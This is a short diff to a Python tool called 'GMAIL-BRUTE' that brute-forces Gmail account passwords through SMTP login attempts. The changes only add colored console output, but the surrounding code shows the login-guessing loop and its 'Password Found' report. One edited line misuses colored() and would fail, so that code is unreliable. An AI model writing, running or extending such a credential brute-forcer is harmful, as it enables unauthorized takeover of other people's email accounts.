@@ -24,7 +24,7 @@ from termcolor import colored
 try:
 	 import pyfiglet ; banner=pyfiglet.figlet_format("GMAIL-BRUTE")
 except:
-	print("Failed to detect pyfiglet.\n","Install pyfiglet\n") ; banner="GMAIL-BRUTE"
+	print(colored("Failed to detect pyfiglet.\n","Install pyfiglet\n", "yellow")) ; banner="GMAIL-BRUTE"
 
 
 print(colored(banner,"red"))
@@ -45,7 +45,7 @@ smtpserver.starttls()
 
 
 def connect_gmail(user, password):
-	print("Trying password {}".format(password))
+	print(colored("Trying password {}".format(password), "red"))
 	try:
 		smtpserver.login(user, password)
 		print(colored("[+] Password Found: %s" % password, "green"))
@@ -53,7 +53,7 @@ def connect_gmail(user, password):
 
 
 	except smtplib.SMTPAuthenticationError:
-		#print(colored("[-]  Wrong Password: " + password, "red"))
+		
 		pass
 
 	except Exception as e:
